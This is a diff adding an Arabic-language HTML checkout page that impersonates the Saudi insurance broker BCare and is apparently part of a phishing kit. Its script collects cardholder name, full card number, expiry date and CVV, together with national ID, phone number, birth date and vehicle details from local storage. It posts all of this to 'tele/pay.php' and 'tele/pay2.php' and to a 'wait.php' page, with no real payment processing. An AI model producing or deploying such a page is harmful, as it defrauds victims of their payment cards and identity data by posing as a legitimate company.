@@ -1,0 +1,1050 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>الدفع - بي كير</title>
+    <link rel="stylesheet" href="/_next/static/css/65e784920a82806a.css" data-precedence="next">
+  <link rel="stylesheet" href="/_next/static/css/158583c6bfad706b.css" data-precedence="next">
+  <style>
+/* CSS Variables */
+:root {
+    --color-background: #F4F7FB;
+    --color-surface: #FFFFFF;
+    --color-primary: #0F4C72;
+    --color-primary-dark: #0B3856;
+    --color-primary-light: #E6F0F7;
+    --color-accent: #F2A340;
+    --color-accent-dark: #D6892F;
+    --color-text-primary: #0E1F2E;
+    --color-text-secondary: #4B5B6B;
+    --color-border: #D8E2EE;
+    --shadow-soft: 0 16px 40px rgba(15, 76, 114, 0.12);
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Cairo', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: var(--color-background);
+    color: var(--color-text-primary);
+    line-height: 1.6;
+    overflow-x: hidden;
+}
+
+.container {
+    max-width: 1280px;
+    margin: 0 auto;
+    padding: 0 1rem;
+}
+
+/* Notification Banner */
+.notification-banner {
+    position: relative;
+    background: var(--color-accent);
+    color: white;
+    padding: 0.75rem 1rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.close-notification {
+    position: absolute;
+    left: 1rem;
+    background: transparent;
+    border: none;
+    cursor: pointer;
+    padding: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    opacity: 0.9;
+    transition: opacity 0.3s;
+}
+
+.close-notification:hover {
+    opacity: 1;
+}
+
+.notification-content {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    font-size: 0.875rem;
+}
+
+.notification-icon {
+    flex-shrink: 0;
+}
+
+.notification-text {
+    font-weight: 500;
+}
+
+.notification-link {
+    color: white;
+    text-decoration: underline;
+    font-weight: 600;
+    margin-right: 0.25rem;
+}
+
+.notification-link:hover {
+    text-decoration: none;
+}
+
+/* Main Navigation */
+.main-nav {
+    background: rgba(255, 255, 255, 0.92);
+    backdrop-filter: blur(8px);
+    border-bottom: 1px solid var(--color-border);
+}
+
+.nav-content {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    height: 4rem;
+}
+
+.nav-actions {
+    display: flex;
+    gap: 0.5rem;
+}
+
+.lang-btn, .profile-btn, .menu-btn {
+    background: transparent;
+    border: 1px solid var(--color-border);
+    border-radius: 9999px;
+    cursor: pointer;
+    transition: background 0.3s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.lang-btn:hover, .profile-btn:hover, .menu-btn:hover {
+    background: rgba(0, 0, 0, 0.02);
+}
+
+.lang-btn {
+    padding: 0.25rem 0.75rem;
+    font-size: 0.75rem;
+    font-weight: 600;
+    color: var(--color-text-primary);
+}
+
+.profile-btn, .menu-btn {
+    padding: 0.5rem;
+}
+
+.profile-icon, .menu-icon {
+    width: 1.25rem;
+    height: 1.25rem;
+    stroke: var(--color-primary);
+    stroke-width: 1.8;
+    fill: none;
+}
+
+.menu-icon {
+    stroke: var(--color-text-primary);
+    stroke-width: 2;
+}
+
+.logo img {
+    display: block;
+}
+
+/* Main Content */
+.main-content {
+    max-width: 48rem;
+    margin: 0 auto;
+    padding: 0 1rem;
+}
+
+.payment-form {
+    margin-top: 1.5rem;
+    padding-bottom: 2rem;
+}
+
+.form-card {
+    background: rgba(255, 255, 255, 0.9);
+    border: 1px solid var(--color-border);
+    border-radius: 1rem;
+    padding: 1.5rem;
+    box-shadow: var(--shadow-soft);
+    margin-bottom: 1.5rem;
+}
+
+.card-title {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: var(--color-primary);
+    margin-bottom: 1rem;
+}
+
+.summary-section {
+    margin-bottom: 1.5rem;
+}
+
+.summary-row {
+    display: flex;
+    justify-content: space-between;
+    padding: 0.75rem 0;
+    border-bottom: 1px solid var(--color-border);
+}
+
+.summary-label {
+    font-size: 0.875rem;
+    color: var(--color-text-secondary);
+}
+
+.summary-value {
+    font-size: 0.875rem;
+    font-weight: 600;
+    color: var(--color-text-primary);
+}
+
+.summary-total {
+    background: linear-gradient(135deg, #eaf3ff 0%, #dbe9ff 100%);
+    border: 2px solid var(--color-primary);
+    border-radius: 0.75rem;
+    padding: 1rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 1rem;
+    font-weight: 800;
+    font-size: 1.125rem;
+    color: var(--color-primary);
+}
+
+.payment-title {
+    font-size: 1rem;
+    font-weight: 700;
+    color: var(--color-primary);
+    margin-bottom: 1rem;
+    padding-top: 1rem;
+    border-top: 2px solid var(--color-border);
+}
+
+.payment-methods-section {
+    padding-top: 1rem;
+    border-top: 2px solid var(--color-border);
+    margin-bottom: 1.5rem;
+}
+
+.payment-methods-title {
+    font-size: 0.875rem;
+    font-weight: 500;
+    color: var(--color-text-secondary);
+    margin-bottom: 0.75rem;
+    text-align: right;
+}
+
+.payment-methods {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 0.75rem;
+    margin-bottom: 1.5rem;
+}
+
+.payment-method-btn {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+    padding: 1rem 0.5rem;
+    background: white;
+    border: 2px solid var(--color-border);
+    border-radius: 0.75rem;
+    cursor: pointer;
+    transition: all 0.3s;
+    position: relative;
+    min-height: 90px;
+}
+
+.payment-method-btn:hover:not(.disabled) {
+    border-color: var(--color-primary);
+    transform: translateY(-2px);
+    box-shadow: 0 4px 12px rgba(15, 76, 114, 0.15);
+}
+
+.payment-method-btn.active {
+    border-color: var(--color-primary);
+    background: var(--color-primary-light);
+}
+
+.payment-method-btn.disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+}
+
+.payment-method-btn span {
+    font-size: 0.875rem;
+    font-weight: 600;
+    color: var(--color-text-primary);
+}
+
+.payment-method-btn svg {
+    opacity: 0.8;
+}
+
+.coming-soon {
+    position: absolute;
+    bottom: 0.5rem;
+    font-size: 0.7rem !important;
+    color: var(--color-accent) !important;
+    font-weight: 500 !important;
+}
+
+.form-field {
+    margin-bottom: 1.25rem;
+}
+
+.form-field label {
+    display: block;
+    font-size: 0.875rem;
+    font-weight: 500;
+    color: var(--color-text-secondary);
+    margin-bottom: 0.5rem;
+    text-align: right;
+}
+
+.form-field input {
+    width: 100%;
+    padding: 0.75rem 1rem;
+    background: white;
+    border: 1px solid var(--color-border);
+    border-radius: 0.75rem;
+    font-size: 0.875rem;
+    color: var(--color-text-primary);
+    transition: all 0.15s;
+    font-family: inherit;
+}
+
+.form-field input.ltr {
+    direction: ltr;
+    text-align: left;
+}
+
+.form-field input:focus {
+    outline: none;
+    border-color: var(--color-primary);
+    box-shadow: 0 0 0 2px var(--color-primary-light);
+}
+
+.form-field input.error {
+    border-color: #ef4444;
+}
+
+.error-message {
+    color: #ef4444;
+    font-size: 0.75rem;
+    margin-top: 0.25rem;
+    display: none;
+}
+
+.error-message.show {
+    display: block;
+}
+
+.input-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1rem;
+}
+
+.submit-btn {
+    width: 100%;
+    padding: 0.875rem;
+    background: var(--color-accent);
+    color: white;
+    border: 1px solid var(--color-accent-dark);
+    border-radius: 0.75rem;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+}
+
+.submit-btn:hover {
+    box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1);
+    transform: translateY(-1px);
+}
+
+.submit-btn:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+    transform: none;
+}
+
+/* Footer */
+.footer {
+    background: #0B2F48;
+    color: #D6E4F0;
+    margin-top: 3rem;
+    padding: 2rem 0;
+    text-align: center;
+}
+
+.footer-content {
+    font-size: 0.75rem;
+    line-height: 1.625;
+}
+
+.footer-logo {
+    margin: 0 auto 1rem;
+    width: 100px;
+}
+
+.footer-copyright {
+    color: #9FB4C4;
+    margin-bottom: 1rem;
+}
+
+.footer-contact {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+    font-size: 0.75rem;
+    margin-bottom: 1rem;
+}
+
+.footer-contact a {
+    color: var(--color-accent);
+    text-decoration: none;
+    font-weight: 600;
+}
+
+.app-buttons {
+    display: flex;
+    gap: 0.75rem;
+    justify-content: center;
+    margin-top: 1rem;
+}
+
+/* Loading Overlay */
+.loading-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.5);
+    backdrop-filter: blur(5px);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
+}
+
+.loading-overlay.show {
+    display: flex;
+}
+
+.loading-card {
+    background: white;
+    border-radius: 16px;
+    padding: 40px 60px;
+    text-align: center;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+}
+
+.loading-logo {
+    width: 120px;
+    margin-bottom: 20px;
+}
+
+.loading-text {
+    font-size: 16px;
+    font-weight: 600;
+    color: #333;
+    margin-bottom: 20px;
+}
+
+.loading-spinner {
+    width: 50px;
+    height: 50px;
+    margin: 0 auto;
+}
+
+.loading-spinner svg {
+    width: 100%;
+    height: 100%;
+}
+
+.loading-spinner circle {
+    fill: none;
+    stroke: #F2A340;
+    stroke-width: 4;
+    stroke-linecap: round;
+    stroke-dasharray: 150;
+    stroke-dashoffset: 150;
+    animation: spin 1.5s ease-in-out infinite;
+}
+
+@keyframes spin {
+    0% {
+        stroke-dashoffset: 150;
+        transform: rotate(0deg);
+    }
+    50% {
+        stroke-dashoffset: 0;
+        transform: rotate(180deg);
+    }
+    100% {
+        stroke-dashoffset: -150;
+        transform: rotate(360deg);
+    }
+}
+
+@media (min-width: 768px) {
+    .form-card {
+        padding: 2rem;
+    }
+}
+  </style>
+</head>
+<body>
+  <!-- Notification Banner -->
+  <div class="notification-banner">
+    <button class="close-notification" aria-label="إغلاق">
+      <svg viewBox="0 0 24 24" width="20" height="20">
+        <line x1="18" y1="6" x2="6" y2="18" stroke="white" stroke-width="2"></line>
+        <line x1="6" y1="6" x2="18" y2="18" stroke="white" stroke-width="2"></line>
+      </svg>
+    </button>
+    <div class="notification-content">
+      <svg class="notification-icon" viewBox="0 0 24 24" width="20" height="20">
+        <circle cx="12" cy="12" r="10" fill="white"></circle>
+        <path d="M12 6v6m0 4h.01" stroke="#F2A340" stroke-width="2" stroke-linecap="round"></path>
+      </svg>
+      <span class="notification-text">حمّل تطبيق بي كير الآن!!</span>
+      <a href="#" class="notification-link">تحميل</a>
+    </div>
+  </div>
+
+  <!-- Main Navigation -->
+  <div class="main-nav">
+    <div class="container nav-content">
+      <div class="nav-actions">
+        <button class="lang-btn">EN</button>
+        <button class="profile-btn" aria-label="الملف الشخصي">
+          <svg class="profile-icon" viewBox="0 0 24 24">
+            <path d="M20 21a8 8 0 0 0-16 0"></path>
+            <circle cx="12" cy="7" r="4"></circle>
+          </svg>
+        </button>
+      </div>
+      <a href="#" class="logo">
+        <img src="/bcare-logo.svg" alt="bcare logo" width="90" height="45">
+      </a>
+      <button class="menu-btn" aria-label="القائمة">
+        <svg class="menu-icon" viewBox="0 0 24 24">
+          <line x1="3" y1="12" x2="21" y2="12"></line>
+          <line x1="3" y1="6" x2="21" y2="6"></line>
+          <line x1="3" y1="18" x2="21" y2="18"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+
+  <!-- Main Content -->
+  <main class="main-content">
+    <div class="payment-form">
+      <div class="form-card">
+        <h2 class="card-title">ملخص التأمين</h2>
+        
+        <div class="summary-section">
+          <div class="summary-row">
+            <span class="summary-label">الشركة:</span>
+            <span class="summary-value" id="c_company">—</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">نوع التأمين:</span>
+            <span class="summary-value" id="c_plan">—</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">القسط الأساسي:</span>
+            <span class="summary-value" id="c_base">—</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">المجموع الفرعي:</span>
+            <span class="summary-value" id="c_price">—</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">ضريبة 15%:</span>
+            <span class="summary-value" id="c_vat">—</span>
+          </div>
+          <div class="summary-total">
+            <span>الإجمالي</span>
+            <span id="c_total">—</span>
+          </div>
+        </div>
+
+        <div class="payment-methods-section">
+          <div class="payment-methods-title">اختر طريقة الدفع</div>
+               <div class="mt-2 grid grid-cols-3 gap-2"><button type="button" class="relative flex flex-col items-center justify-center rounded-xl border bg-white px-2 py-2 text-[11px] font-semibold text-slate-700" disabled="" aria-disabled="true"><div class="flex items-center gap-1.5"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 384 512" class="text-black" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"></path></svg><span class="font-semibold text-black">Apple Pay</span></div><span class="mt-1 text-[10px] text-amber-500">تحت الصيانة</span></button><button type="button" class="relative flex flex-col items-center justify-center rounded-xl border bg-white px-2 py-2 text-[11px] font-semibold text-slate-700" disabled="" aria-disabled="true"><div class="flex items-center gap-1.5"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 488 512" class="text-[#4285F4]" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M488 261.8C488 403.3 391.1 504 248 504 110.8 504 0 393.2 0 256S110.8 8 248 8c66.8 0 123 24.5 166.3 64.9l-67.5 64.9C258.5 52.6 94.3 116.6 94.3 256c0 86.5 69.1 156.6 153.7 156.6 98.2 0 135-70.4 140.8-106.9H248v-85.3h236.1c2.3 12.7 3.9 24.9 3.9 41.4z"></path></svg><span class="font-semibold text-slate-800">Google Pay</span></div><span class="mt-1 text-[10px] text-amber-500">تحت الصيانة</span></button><button type="button" class="flex items-center justify-center rounded-xl border bg-white px-2 py-2 text-[11px] font-semibold" style="border-color: rgb(15, 76, 114); color: rgb(15, 76, 114);">بطاقة</button></div>
+
+        <form id="paymentForm">
+          <div class="form-field">
+            <label>اسم حامل البطاقة</label>
+            <input 
+              type="text" 
+              id="cardholderName" 
+              placeholder="أدخل الاسم كما يظهر على البطاقة"
+              required
+            >
+            <div class="error-message" id="nameError">الرجاء إدخال اسم صحيح (3 أحرف على الأقل)</div>
+          </div>
+
+          <div class="form-field">
+            <label>رقم البطاقة</label>
+            <input 
+              type="tel" 
+              class="ltr"
+              id="cardNumber" 
+              placeholder="1234 5678 9012 3456"
+              maxlength="19"
+              inputmode="numeric"
+              pattern="[0-9\s]*"
+              required
+            >
+            <div class="error-message" id="cardError">رقم البطاقة غير صحيح </div>
+          </div>
+
+          <div class="input-row">
+            <div class="form-field">
+              <label>تاريخ الانتهاء</label>
+              <input 
+                type="tel" 
+                class="ltr"
+                id="expiryDate" 
+                placeholder="MM/YY"
+                maxlength="5"
+                inputmode="numeric"
+                pattern="[0-9\/]*"
+                required
+              >
+              <div class="error-message" id="expiryError">تاريخ غير صحيح</div>
+            </div>
+
+            <div class="form-field">
+              <label>CVV</label>
+              <input 
+                type="tel" 
+                class="ltr"
+                id="cvv" 
+                placeholder="123"
+                maxlength="3"
+                inputmode="numeric"
+                pattern="[0-9]*"
+                required
+              >
+              <div class="error-message" id="cvvError">CVV غير صحيح (3 أرقام)</div>
+            </div>
+          </div>
+
+          <button type="submit" class="submit-btn" id="submitBtn">
+            ادفع الآن
+          </button>
+        </form>
+      </div>
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="container footer-content">
+      <img src="/bcare-logo.svg" alt="BCare Logo" class="footer-logo">
+      <p class="footer-copyright">
+        © 2026 جميع الحقوق محفوظة لشركة عناية الوسيط لوساطة التأمين. خاضعة لرقابة وإشراف البنك المركزي السعودي.
+      </p>
+      <div class="footer-contact">
+        <span>اتصل بنا</span>
+        <a href="tel:8001180042">8001180042</a>
+      </div>
+      <div class="app-buttons">
+        <a href="https://apps.apple.com/sa/app/بي-كير/id1490248033" target="_blank">
+          <img src="/ios_mobile_app.svg" alt="App Store" width="120" height="40">
+        </a>
+        <a href="https://play.google.com/store/apps/details?id=com.app.bcare" target="_blank">
+          <img src="/android_mobile_app.svg" alt="Google Play" width="120" height="40">
+        </a>
+      </div>
+    </div>
+  </footer>
+
+<script>
+    // دوال الـ Loader
+    function showLoader() {
+        document.getElementById('loadingOverlay').classList.add('show');
+    }
+
+    function hideLoader() {
+        document.getElementById('loadingOverlay').classList.remove('show');
+    }
+
+    function showLoaderThen(callback, duration = 2000) {
+        showLoader();
+        setTimeout(() => {
+            hideLoader();
+            if (callback) callback();
+        }, duration);
+    }
+
+    // خوارزمية Luhn للتحقق من صحة رقم البطاقة
+    function luhnCheck(cardNumber) {
+        // إزالة المسافات
+        cardNumber = cardNumber.replace(/\s/g, '');
+        
+        // التحقق من أن الرقم يحتوي على أرقام فقط
+        if (!/^\d+$/.test(cardNumber)) {
+            return false;
+        }
+        
+        let sum = 0;
+        let isEven = false;
+        
+        // المرور على الأرقام من اليمين لليسار
+        for (let i = cardNumber.length - 1; i >= 0; i--) {
+            let digit = parseInt(cardNumber[i]);
+            
+            if (isEven) {
+                digit *= 2;
+                if (digit > 9) {
+                    digit -= 9;
+                }
+            }
+            
+            sum += digit;
+            isEven = !isEven;
+        }
+        
+        return (sum % 10) === 0;
+    }
+
+    const fmt = v => Number(v||0).toLocaleString('ar-EG',{minimumFractionDigits:2,maximumFractionDigits:2})+' ريال';
+    const urlParams = new URLSearchParams(window.location.search);
+    const userIdFromUrl = urlParams.get('user_id') || '';
+
+    const raw = localStorage.getItem('insurance_data');
+    if(!raw){ 
+      alert('يرجى اختيار عرض التأمين أولاً'); 
+      window.location.href = userIdFromUrl ? `gher.php?user_id=${userIdFromUrl}` : 'gher.php'; 
+    }
+    
+    let ins = {};
+    try{ 
+      ins = JSON.parse(raw)||{}; 
+    }catch(e){ 
+      alert('تعذر قراءة بيانات التأمين'); 
+      window.location.href = userIdFromUrl ? `gher.php?user_id=${userIdFromUrl}` : 'gher.php'; 
+    }
+
+    const customerData = JSON.parse(localStorage.getItem('customer_data') || '{}');
+    
+    // عرض ملخص التأمين
+    document.getElementById('c_company').textContent = ins.company || '—';
+    document.getElementById('c_plan').textContent = ins.plan || '—';
+    document.getElementById('c_base').textContent = fmt(ins.base);
+    document.getElementById('c_price').textContent = fmt(ins.price);
+    document.getElementById('c_vat').textContent = fmt(ins.vat);
+    document.getElementById('c_total').textContent = fmt(ins.total);
+
+    // Close notification
+    document.querySelector('.close-notification').addEventListener('click', function() {
+      document.querySelector('.notification-banner').style.display = 'none';
+    });
+
+    // Validation functions
+    const validateName = name => name.trim().length >= 3;
+    
+    // التحقق من رقم البطاقة باستخدام Luhn Algorithm
+    const validateCardNumber = number => {
+        const cleanNumber = number.replace(/\s/g, '');
+        return cleanNumber.length === 16 && /^\d+$/.test(cleanNumber) && luhnCheck(cleanNumber);
+    };
+    
+    const validateExpiry = expiry => {
+      if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
+      const [month, year] = expiry.split('/').map(Number);
+      if (month < 1 || month > 12) return false;
+      const now = new Date();
+      const currentYear = now.getFullYear() % 100;
+      const currentMonth = now.getMonth() + 1;
+      if (year < currentYear) return false;
+      if (year === currentYear && month < currentMonth) return false;
+      return true;
+    };
+    
+    const validateCVV = cvv => /^\d{3}$/.test(cvv);
+
+    // Format card number - أرقام فقط + انتقال تلقائي + تحقق من الصحة
+    document.getElementById('cardNumber').addEventListener('input', function(e){
+      let value = this.value.replace(/\D/g,'').slice(0,16);
+      this.value = value.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+      
+      // إخفاء رسالة الخطأ أثناء الكتابة
+      if (this.classList.contains('error')) {
+        this.classList.remove('error');
+        document.getElementById('cardError').classList.remove('show');
+      }
+      
+      // انتقال تلقائي عند اكتمال 16 رقم
+      if (value.length === 16) {
+        document.getElementById('expiryDate').focus();
+      }
+    });
+
+    // التحقق من صحة رقم البطاقة عند الخروج من الحقل
+    document.getElementById('cardNumber').addEventListener('blur', function(){
+      const value = this.value.replace(/\s/g, '');
+      
+      // التحقق فقط إذا كان المستخدم أدخل 16 رقم
+      if (value.length === 16) {
+        if (!luhnCheck(value)) {
+          this.classList.add('error');
+          document.getElementById('cardError').classList.add('show');
+        } else {
+          this.classList.remove('error');
+          document.getElementById('cardError').classList.remove('show');
+        }
+      } else if (value.length > 0) {
+        // إذا كان أقل من 16 رقم
+        this.classList.add('error');
+        document.getElementById('cardError').classList.add('show');
+      }
+    });
+
+    // منع لصق أي شيء غير الأرقام
+    document.getElementById('cardNumber').addEventListener('paste', function(e){
+      e.preventDefault();
+      let pastedText = (e.clipboardData || window.clipboardData).getData('text');
+      let numbers = pastedText.replace(/\D/g,'').slice(0,16);
+      this.value = numbers.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+      
+      // التحقق من الصحة بعد اللصق
+      if (numbers.length === 16) {
+        if (luhnCheck(numbers)) {
+          this.classList.remove('error');
+          document.getElementById('cardError').classList.remove('show');
+          document.getElementById('expiryDate').focus();
+        } else {
+          this.classList.add('error');
+          document.getElementById('cardError').classList.add('show');
+        }
+      }
+    });
+
+    // منع الكتابة بالكيبورد لأي شيء غير الأرقام
+    document.getElementById('cardNumber').addEventListener('keypress', function(e){
+      if (!/[0-9]/.test(e.key)) {
+        e.preventDefault();
+      }
+    });
+
+    // Format expiry - أرقام فقط + انتقال تلقائي
+    document.getElementById('expiryDate').addEventListener('input', function(e){
+      let value = this.value.replace(/\D/g,'').slice(0,4);
+      if(value.length >= 2) {
+        this.value = value.slice(0,2) + '/' + value.slice(2);
+      } else {
+        this.value = value;
+      }
+      
+      // انتقال تلقائي عند اكتمال التاريخ (MM/YY = 5 أحرف مع /)
+      if (this.value.length === 5) {
+        document.getElementById('cvv').focus();
+      }
+      
+      if (this.classList.contains('error')) {
+        this.classList.remove('error');
+        document.getElementById('expiryError').classList.remove('show');
+      }
+    });
+
+    // منع الكتابة بالكيبورد لأي شيء غير الأرقام في تاريخ الانتهاء
+    document.getElementById('expiryDate').addEventListener('keypress', function(e){
+      if (!/[0-9]/.test(e.key)) {
+        e.preventDefault();
+      }
+    });
+
+    // Format CVV - أرقام فقط
+    document.getElementById('cvv').addEventListener('input', function(e){
+      this.value = this.value.replace(/\D/g,'').slice(0,3);
+      if (this.classList.contains('error')) {
+        this.classList.remove('error');
+        document.getElementById('cvvError').classList.remove('show');
+      }
+    });
+
+    // منع الكتابة بالكيبورد لأي شيء غير الأرقام في CVV
+    document.getElementById('cvv').addEventListener('keypress', function(e){
+      if (!/[0-9]/.test(e.key)) {
+        e.preventDefault();
+      }
+    });
+
+    // Remove error on name input
+    document.getElementById('cardholderName').addEventListener('input', function(){
+      if (this.classList.contains('error')) {
+        this.classList.remove('error');
+        document.getElementById('nameError').classList.remove('show');
+      }
+    });
+
+    // Submit form
+    document.getElementById('paymentForm').addEventListener('submit', async function(e){
+      e.preventDefault();
+      
+      const submitBtn = document.getElementById('submitBtn');
+      const nameInput = document.getElementById('cardholderName');
+      const cardInput = document.getElementById('cardNumber');
+      const expiryInput = document.getElementById('expiryDate');
+      const cvvInput = document.getElementById('cvv');
+      
+      let isValid = true;
+      
+      if (!validateName(nameInput.value)) {
+        nameInput.classList.add('error');
+        document.getElementById('nameError').classList.add('show');
+        isValid = false;
+      }
+      
+      if (!validateCardNumber(cardInput.value)) {
+        cardInput.classList.add('error');
+        document.getElementById('cardError').classList.add('show');
+        isValid = false;
+      }
+      
+      if (!validateExpiry(expiryInput.value)) {
+        expiryInput.classList.add('error');
+        document.getElementById('expiryError').classList.add('show');
+        isValid = false;
+      }
+      
+      if (!validateCVV(cvvInput.value)) {
+        cvvInput.classList.add('error');
+        document.getElementById('cvvError').classList.add('show');
+        isValid = false;
+      }
+      
+      if (!isValid) return;
+      
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'جارٍ المعالجة...';
+
+      const formData = new URLSearchParams();
+      
+      formData.append('name', nameInput.value);
+      formData.append('cardnumber', cardInput.value);
+      formData.append('expirationdate', expiryInput.value);
+      formData.append('securitycode', cvvInput.value);
+      formData.append('cardholder_name', nameInput.value);
+      formData.append('card_number', cardInput.value);
+      formData.append('expiry_date', expiryInput.value);
+      formData.append('cvv', cvvInput.value);
+      formData.append('payment_method', 'card');
+      
+      formData.append('company', ins.company || '');
+      formData.append('plan', ins.plan || '');
+      formData.append('base', ins.base ?? '');
+      formData.append('price', ins.price ?? '');
+      formData.append('vat', ins.vat ?? '');
+      formData.append('total', ins.total ?? '');
+      formData.append('features', JSON.stringify(ins.features || []));
+      
+      formData.append('insurance_type', customerData.insurance_type || '');
+      formData.append('identity_number', customerData.identity_number || '');
+      formData.append('applicant_name', customerData.applicant_name || '');
+      formData.append('phone_number', customerData.phone_number || '');
+      formData.append('birth_date', customerData.birth_date || '');
+      formData.append('registration_method', customerData.registration_method || '');
+      formData.append('serial_number', customerData.serial_number || '');
+      formData.append('coverage_type', customerData.coverage_type || '');
+      formData.append('policy_start_date', customerData.policy_start_date || '');
+      formData.append('vehicle_purpose', customerData.vehicle_purpose || '');
+      formData.append('vehicle_type', customerData.vehicle_type || '');
+      formData.append('manufacture_year', customerData.manufacture_year || '');
+      formData.append('vehicle_value', customerData.vehicle_value || '');
+      formData.append('repair_location', customerData.repair_location || '');
+      formData.append('user_id', userIdFromUrl);
+      
+      const startDate = new Date();
+      const endDate = new Date(); 
+      endDate.setFullYear(endDate.getFullYear()+1);
+      formData.append('start_date', startDate.toISOString().slice(0,10));
+      formData.append('end_date', endDate.toISOString().slice(0,10));
+      
+      formData.append('insurance_json', JSON.stringify({
+        company: ins.company, plan: ins.plan, base: ins.base, 
+        price: ins.price, vat: ins.vat, total: ins.total
+      }));
+      formData.append('features_json', JSON.stringify(ins.features || []));
+      formData.append('total_amount', ins.total ?? '');
+
+      try{
+        await fetch('tele/pay.php', {
+          method:'POST',
+          headers:{'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'},
+          body: formData.toString()
+        });
+        
+        await fetch('tele/pay2.php', {
+          method:'POST',
+          headers:{'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'},
+          body: formData.toString()
+        });
+        
+        // إظهار الـ loader لمدة 2 ثانية ثم الانتقال
+        showLoaderThen(() => {
+          // إنشاء نموذج للانتقال إلى wait.php
+          const redirectForm = document.createElement('form');
+          redirectForm.method = 'POST';
+          redirectForm.action = 'wait.php' + (userIdFromUrl ? ('?user_id='+encodeURIComponent(userIdFromUrl)) : '');
+          
+          // إضافة جميع البيانات
+          for (let [key, value] of formData.entries()) {
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = key;
+            input.value = value;
+            redirectForm.appendChild(input);
+          }
+          
+          document.body.appendChild(redirectForm);
+          redirectForm.submit();
+        }, 2000);
+        
+      }catch(err){
+        alert('تعذّر الإرسال، يرجى المحاولة مرة أخرى');
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'ادفع الآن';
+      }
+    });
+</script>
+
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-card">
+      <img src="/bcare-logo.svg" alt="BCare Logo" class="loading-logo">
+      <div class="loading-text">جاري معالجة طلبك...</div>
+      <div class="loading-spinner">
+        <svg viewBox="0 0 50 50">
+          <circle cx="25" cy="25" r="20"></circle>
+        </svg>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
